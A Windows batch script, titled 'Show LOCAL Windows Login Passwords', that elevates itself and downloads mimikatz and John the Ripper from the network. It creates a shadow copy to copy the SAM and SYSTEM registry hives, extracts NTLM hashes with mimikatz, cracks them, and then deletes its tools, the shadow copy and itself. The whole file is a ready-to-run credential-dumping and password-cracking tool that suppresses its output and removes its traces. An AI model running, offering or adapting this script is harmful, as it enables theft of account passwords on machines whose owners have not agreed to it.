@ECHO OFF
TASKLIST /V /NH /FI "imagename eq cmd.exe"|FINDSTR /I /C^:"Show LOCAL Windows Login Passwords">nul
IF %errorlevel% NEQ 1 (
	POWERSHELL -nop -c "$^={$Notify=[PowerShell]::Create().AddScript({$Audio=New-Object System.Media.SoundPlayer;$Audio.SoundLocation=$env:WinDir + '\Media\Windows Notify System Generic.wav';$Audio.playsync()});$rs=[RunspaceFactory]::CreateRunspace();$rs.ApartmentState="^""STA"^"";$rs.ThreadOptions="^""ReuseThread"^"";$rs.Open();$Notify.Runspace=$rs;$Notify.BeginInvoke()};&$^;$PopUp=New-Object -ComObject Wscript.Shell;$PopUp.Popup("^""The script is already running!"^"",0,'ERROR:',0x10)">nul&EXIT
)
TITLE Show LOCAL Windows Login Passwords
REM The below address should contain the text "Microsoft NCSI". This is how MS determines a valid internet connection that isnt behind a splash screen/hotspot landing page, etc. 
FOR /F "usebackq tokens=* delims=" %%# IN (`POWERSHELL -nop -c "$ProgressPreference='SilentlyContinue';irm http://www.msftncsi.com/ncsi.txt;$ProgressPreference='Continue'"`) DO (
	IF NOT "%%#"=="Microsoft NCSI" (
		ECHO Internet connection not detected! Internet is required to retrieve the necessary tools.
		ECHO/
		PAUSE
		EXIT
	)
)
>nul 2>&1 REG ADD HKCU\Software\classes\.ShowLocalLoginPW\shell\runas\command /f /ve /d "CMD /x /d /r SET \"f0=1\"&CALL \"%%2\" %%3"
IF /I NOT "%~dp0" == "%ProgramData%\" (
	ECHO|(SET /p="%~dp0")>"%ProgramData%\launcher.ShowLocalLoginPW"
	>nul 2>&1 COPY /Y "%~f0" "%ProgramData%"
	>nul 2>&1 FLTMC && (
		CALL :SETTERMINAL
		START "ReLaunching..." "%ProgramData%\launcher.ShowLocalLoginPW" "%ProgramData%\%~nx0"
		CALL :RESTORETERMINAL
	) || (
		IF NOT "%f0%"=="1" (
			CALL :SETTERMINAL
			START "ReLaunching..." /high "%ProgramData%\launcher.ShowLocalLoginPW" "%ProgramData%\%~nx0"
			CALL :RESTORETERMINAL
			EXIT /b
		)
	)
	EXIT /b
)
>nul 2>&1 REG DELETE HKCU\Software\classes\.ShowLocalLoginPW\ /F
>nul 2>&1 DEL "%ProgramData%\launcher.ShowLocalLoginPW" /F /Q
IF EXIST "%ProgramData%\JtR" >nul 2>&1 RD "%ProgramData%\JtR" /S /Q
ECHO Finding LOCAL Windows Login Passwords... Please wait..
>nul 2>&1 POWERSHELL -nop -c "irm -Uri 'https://www.7-zip.org/a/7zr.exe' -o '%ProgramData%\7zr.exe';irm -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z' -o '%ProgramData%\mimikatz.7z';Start-BitsTransfer -Priority Foreground -Source 'https://github.com/openwall/john-packages/releases/download/bleeding/winX64_1_JtR.7z' -Destination '%ProgramData%\winX64_1_JtR.7z'"
>nul 2>&1 "%ProgramData%\7zr.exe" x -y "%ProgramData%\winX64_1_JtR.7z" -o"%ProgramData%\"
>nul 2>&1 "%ProgramData%\7zr.exe" e -y "%ProgramData%\mimikatz.7z" -o"%ProgramData%\JtR" "x64\*"
>nul 2>&1 DEL "%ProgramData%\7zr.exe" /F /Q
>nul 2>&1 DEL "%ProgramData%\mimikatz.7z" /F /Q
>nul 2>&1 DEL "%ProgramData%\winX64_1_JtR.7z"
>nul 2>&1 POWERSHELL -nop -c "(Get-WmiObject -list win32_shadowcopy).Create('C:\','ClientAccessible')"
FOR /F "usebackq tokens=1,2 delims=:" %%# IN (`vssadmin list shadows`) DO (
	IF /I "%%#"=="      Shadow Copy ID" SET "ID=%%$"
	IF /I "%%#"=="         Shadow Copy Volume" SET "VOL=%%$"
)
SETLOCAL ENABLEDELAYEDEXPANSION
>nul 2>&1 MKLINK /d "%ProgramData%\ShowLocalLoginPWVSS" "!VOL:~1!\"
>nul 2>&1 COPY /Y "%ProgramData%\ShowLocalLoginPWVSS\Windows\System32\config\SAM" "%ProgramData%\JtR"
>nul 2>&1 COPY /Y "%ProgramData%\ShowLocalLoginPWVSS\Windows\System32\config\SYSTEM" "%ProgramData%\JtR"
>nul 2>&1 RMDIR %ProgramData%\ShowLocalLoginPWVSS
>nul 2>&1 VSSADMIN DELETE SHADOWS /Shadow=!ID:~1! /quiet
ENDLOCAL
CD.>"%ProgramData%\JtR\run\hash.txt"
FOR /F "usebackq tokens=1,2 delims=:" %%i IN (`%ProgramData%\JtR\mimikatz "lsadump::sam /system:%ProgramData%\JtR\SYSTEM /sam:%ProgramData%\JtR\SAM" exit`) DO (
	IF /I "%%i"=="User " SET "USER=%%j"
	SET "HASH=%%j"
	SETLOCAL ENABLEDELAYEDEXPANSION
	IF /I NOT "!USER:~1!"=="WDAGUtilityAccount" (
		IF /I "%%i"=="  Hash NTLM" (
			ECHO !USER:~1!:!HASH:~1!>>"%ProgramData%\JtR\run\hash.txt"
		)
	)
	ENDLOCAL
)
IF EXIST "%ProgramData%\JtR\mimi*.*" (
	>nul 2>&1 DEL "%ProgramData%\JtR\mimi*.*" /F /Q
)
IF EXIST "%ProgramData%\JtR\SAM." (
	>nul 2>&1 DEL "%ProgramData%\JtR\SAM." /F /Q
)
IF EXIST "%ProgramData%\JtR\SYSTEM." (
	>nul 2>&1 DEL "%ProgramData%\JtR\SYSTEM." /F /Q
)
FOR /F "tokens=*" %%# in ('wmic cpu get NumberOfCores /value ^| find "="') do (
	FOR /F "tokens=2 delims==" %%# in ("%%#") do (
		SET AVAILABLECORES=%%#
	)
)
IF DEFINED AVAILABLECORES (
	SET "FLAG=--fork=%AVAILABLECORES%"
)
PUSHD "%ProgramData%\JtR\run"
SETLOCAL ENABLEDELAYEDEXPANSION
john hash.txt --format=NT !FLAG!
ENDLOCAL
POPD
ECHO/
PAUSE
>nul 2>&1 RD "%ProgramData%\JtR" /S /Q
(GOTO) 2>nul&DEL "%~f0"/F /Q>nul&EXIT
REM SETERMINAL Changes the terminal(CMD window) to Console Host, instead of Windows Terminal. This allows the titlebar to be read to ensure only one instance is running. RESTORETERMINAL puts the settings back the way they were. These functions are called immediately one after the other during initial relaunching of the script, so that system settings remain the same, and are only changed for a split second so this script can use them.
:SETTERMINAL
SET "LEGACY={B23D10C0-E52E-411E-9D5B-C09FDF709C7D}"
SET "LETWIN={00000000-0000-0000-0000-000000000000}"
SET "TERMINAL={2EACA947-7F5F-4CFA-BA87-8F7FBEEFBE69}"
SET "TERMINAL2={E12CFF52-A866-4C77-9A90-F570A7AA2C6B}"
POWERSHELL -nop -c "Get-WmiObject -Class Win32_OperatingSystem | Select -ExpandProperty Caption | Find 'Windows 11'">nul
IF ERRORLEVEL 0 (
	SET isEleven=1
	>nul 2>&1 REG QUERY "HKCU\Console\%%%%Startup" /v DelegationConsole
	IF ERRORLEVEL 1 (
		REG ADD "HKCU\Console\%%%%Startup" /v DelegationConsole /t REG_SZ /d "%LETWIN%" /f>nul
		REG ADD "HKCU\Console\%%%%Startup" /v DelegationTerminal /t REG_SZ /d "%LETWIN%" /f>nul
	)
	FOR /F "usebackq tokens=3" %%# IN (`REG QUERY "HKCU\Console\%%%%Startup" /v DelegationConsole 2^>nul`) DO (
		IF NOT "%%#"=="%LEGACY%" (
			SET "DEFAULTCONSOLE=%%#"
			REG ADD "HKCU\Console\%%%%Startup" /v DelegationConsole /t REG_SZ /d "%LEGACY%" /f>nul
			REG ADD "HKCU\Console\%%%%Startup" /v DelegationTerminal /t REG_SZ /d "%LEGACY%" /f>nul
		)
	)
)
FOR /F "usebackq tokens=3" %%# IN (`REG QUERY "HKCU\Console" /v ForceV2 2^>nul`) DO (
	IF NOT "%%#"=="0x1" (
		SET LEGACYTERM=0
		REG ADD "HKCU\Console" /v ForceV2 /t REG_DWORD /d 1 /f>nul
	) ELSE (
		SET LEGACYTERM=1
	)
)
EXIT /b
:RESTORETERMINAL
IF "%isEleven%"=="1" (
	IF DEFINED DEFAULTCONSOLE (
		IF "%DEFAULTCONSOLE%"=="%TERMINAL%" (
			REG ADD "HKCU\Console\%%%%Startup" /v DelegationConsole /t REG_SZ /d "%TERMINAL%" /f>nul
			REG ADD "HKCU\Console\%%%%Startup" /v DelegationTerminal /t REG_SZ /d "%TERMINAL2%" /f>nul
		) ELSE (
			REG ADD "HKCU\Console\%%%%Startup" /v DelegationConsole /t REG_SZ /d "%DEFAULTCONSOLE%" /f>nul
			REG ADD "HKCU\Console\%%%%Startup" /v DelegationTerminal /t REG_SZ /d "%DEFAULTCONSOLE%" /f>nul
		)
	)
)
IF "%LEGACYTERM%"=="0" (
	REG ADD "HKCU\Console" /v ForceV2 /t REG_DWORD /d 0 /f>nul
)
EXIT /b